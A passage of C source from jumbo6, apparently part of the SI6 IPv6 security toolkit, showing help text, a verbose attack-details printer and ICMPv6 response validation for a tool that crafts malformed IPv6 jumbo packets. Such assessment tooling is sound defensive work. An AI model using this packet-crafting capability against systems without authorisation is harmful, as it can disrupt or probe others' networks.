	     "       [-g PREFIX[/LEN]] [-B LINK_ADDR] [-G LINK_ADDR] [-L | -l] [-z SECONDS]\n"
	     "       [-v] [-h]");
}


/*
 * Function: print_help()
 *
 * Prints help information for the jumbo6 tool
 */
void print_help(void){
	puts(SI6_TOOLKIT);
	puts("jumbo6: Security assessment tool for attack vectors based on IPv6 jumbo packets\n");
    usage();
    
    puts("\nOPTIONS:\n"
	"  --interface, -i           Network interface\n"
	"  --link-src-address, -S    Link-layer Destination Address\n"
	"  --link-dst-address, -D    Link-layer Source Address\n"
	"  --src-address, -s         IPv6 Source Address\n"
	"  --dst-address, -d         IPv6 Destination Address\n"
	"  --hop-limit, -A           IPv6 Hop Limit\n"
	"  --frag-hdr. -y            Fragment Header\n"
	"  --dst-opt-hdr, -u         Destination Options Header (Fragmentable Part)\n"
	"  --dst-opt-u-hdr, -U       Destination Options Header (Unfragmentable Part)\n"
	"  --hbh-opt-hdr, -H         Hop by Hop Options Header\n"
	"  --ipv6-length, -q         IPv6 Payload Length\n"
	"  --jumbo-length, -Q        Jumbo Payload Length\n"
	"  --payload-size, -P        ICMPv6 payload size\n"
	"  --loop, -l                Send periodic Jumbo messages\n"
	"  --sleep, -z               Pause between sending Redirect messages\n"
	"  --listen, -L              Listen to incoming packets\n"
	"  --verbose, -v             Be verbose\n"
	"  --help, -h                Print help for the jumbo6 tool\n"
	"\n"
	"Programmed by Fernando Gont on behalf of CPNI (http://www.cpni.gov.uk)\n"
	"Please send any bug reports to <fgont@si6networks.com>\n"
	);
}


/*
 * Function: print_attack_info()
 *
 * Prints attack details (when the verbose ("-v") option is specified).
 */
 
void print_attack_info(struct iface_data *idata){
	puts( "jumbo6: Security assessment tool for attack vectors based on IPv6 Jumbo Payloads\n");

	if(idata->hsrcaddr_f){
			if(ether_ntop(&(idata->hsrcaddr), plinkaddr, sizeof(plinkaddr)) == 0){
				puts("ether_ntop(): Error converting address");
				exit(EXIT_FAILURE);
			}

			printf("Ethernet Source Address: %s\n", plinkaddr);
	}
	else{
		if(idata->dstaddr_f){
			if(ether_ntop(&(idata->hsrcaddr), plinkaddr, sizeof(plinkaddr)) == 0){
				puts("ether_ntop(): Error converting address");
				exit(EXIT_FAILURE);
			}

			printf("Ethernet Source Address: %s%s\n", plinkaddr, \
			((idata->srcprefix_f)?" (randomized)":" (automatically selected)"));
		}
		else
			puts("Ethernet Source Address: Automatically selected for each packet");
	}

	/* 
	   Ethernet Destination Address only used if a IPv6 Destination Address or an
	   Ethernet Destination Address were specified.
	 */
	if(idata->dstaddr_f){
		if(ether_ntop(&(idata->hdstaddr), plinkaddr, sizeof(plinkaddr)) == 0){
			puts("ether_ntop(): Error converting address");
			exit(EXIT_FAILURE);
		}

		printf("Ethernet Destination Address: %s%s\n", plinkaddr, \
									((!idata->hdstaddr_f)?" (automatically selected)":""));
	}


	if(inet_ntop(AF_INET6, &(idata->srcaddr), psrcaddr, sizeof(psrcaddr)) == NULL){
		puts("inet_ntop(): Error converting IPv6 Source Address to presentation format");
		exit(EXIT_FAILURE);
	}


	if(idata->dstaddr_f){
		printf("IPv6 Source Address: %s%s\n", psrcaddr, ((idata->srcprefix_f)?" (randomized)":""));
	}

	if(idata->dstaddr_f){
		if(inet_ntop(AF_INET6, &(idata->dstaddr), pdstaddr, sizeof(pdstaddr)) == NULL){
			puts("inet_ntop(): Error converting IPv6 Destination Address to presentation format");
			exit(EXIT_FAILURE);
		}

		printf("IPv6 Destination Address: %s\n", pdstaddr);
	}

	printf("IPv6 Hop Limit: %u%s\n", hoplimit, (hoplimit_f)?"":" (randomized)");

	for(i=0; i<ndstoptuhdr; i++)
		printf("Destination Options Header (Unfragmentable part): %u bytes\n", dstoptuhdrlen[i]);

	for(i=0; i<nhbhopthdr; i++)
		printf("Hop by Hop Options Header: %u bytes\n", hbhopthdrlen[i]);

	for(i=0; i<ndstopthdr; i++)
		printf("Destination Options Header: %u bytes\n", dstopthdrlen[i]);

	if(fragh_f)
		printf("Sending each packet in fragments of %u bytes (plus the Unfragmentable part)\n", nfrags);

}




/*
 * Function: valid_icmp6_response()
 *
 * Checks whether the response to an ICMPv6 probe is valid
 */

int valid_icmp6_response(struct iface_data *idata, struct pcap_pkthdr *pkthdr, const u_char *pktdata){

	struct ether_header	*pkt_ether;
	struct ip6_hdr		*pkt_ipv6;
	struct icmp6_hdr	*pkt_icmp6, *pkt_icmp6_icmp6;
	unsigned char		*pkt_end;

	pkt_ether = (struct ether_header *) pktdata;
	pkt_ipv6 = (struct ip6_hdr *)((char *) pkt_ether + ETHER_HDR_LEN);
	pkt_icmp6 = (struct icmp6_hdr *) ((char *) pkt_ipv6 + MIN_IPV6_HLEN);
	pkt_icmp6_icmp6= (struct icmp6_hdr *) ((unsigned char *) pkt_icmp6 + sizeof(struct icmp6_hdr) +\
						sizeof(struct ip6_hdr) + MIN_HBH_LEN);
	pkt_end = (unsigned char *) pktdata + pkthdr->caplen;

	switch(pkt_icmp6->icmp6_type){
		case ICMP6_ECHO_REPLY:
			/* The packet length is the minimum of what we capured, and what is specified in the
			   IPv6 Total Lenght field
			 */
			if( pkt_end > ((unsigned char *)pkt_icmp6 + pkt_ipv6->ip6_plen) )
				pkt_end = (unsigned char *)pkt_icmp6 + pkt_ipv6->ip6_plen;

			/*
			   Discard the packet if it is not of the minimum size to contain an ICMPv6 
			   header and the payload we included in the ICMPv6 Echo Request
			 */
			if( (pkt_end - (unsigned char *) pkt_icmp6) < (sizeof(struct icmp6_hdr) + \
									icmp6psize) ){
				return 0;
			}

			if(pkt_icmp6->icmp6_data16[0] != htons(getpid())){
				return 0;
			}

			break;

		case ICMP6_PARAM_PROB:
			/* The packet length is the minimum of what we capured, and what is specified in the
			   IPv6 Total Lenght field
			 */
			if( pkt_end > ((unsigned char *)pkt_icmp6 + pkt_ipv6->ip6_plen) )
				pkt_end = (unsigned char *)pkt_icmp6 + pkt_ipv6->ip6_plen;

			/*
			   Discard the packet if it is not of the minimum size to contain an ICMPv6 
			   header and the payload we included in the ICMPv6 Echo Request
			 */
			if( (pkt_end - (unsigned char *) pkt_icmp6) < (sizeof(struct icmp6_hdr) + \
						+ sizeof(struct ip6_hdr) + sizeof(struct icmp6_hdr) + \
						  icmp6psize) ){
				return 0;
			}

			if(pkt_icmp6_icmp6->icmp6_data16[0] != htons(getpid())){
				return 0;
			}

			break;

		default:
			return 0;
			break;
	}

	/*
	   Check that the Source Address of the Packet is "valid"
	 */
	if(IN6_IS_ADDR_UNSPECIFIED(&(pkt_ipv6->ip6_src))){
		return 0;
	}

	if(IN6_IS_ADDR_LOOPBACK(&(pkt_ipv6->ip6_src))){
		return 0;
	}

	if(IN6_IS_ADDR_MULTICAST(&(pkt_ipv6->ip6_src))){
		return 0;
	}

	/* 
	   Check that that the Destination Address of the incoming packet is one
	   of our addresses.
	 */
	if(!is_eq_in6_addr(&(idata->srcaddr), &(pkt_ipv6->ip6_dst))){
		return 0;
	}

	/* Check that the ICMPv6 checksum is correct */
	if(in_chksum(pkt_ipv6, pkt_icmp6, pkt_end-((unsigned char *)pkt_icmp6), IPPROTO_ICMPV6) != 0){
		return 0;
	}

	return 1;
}

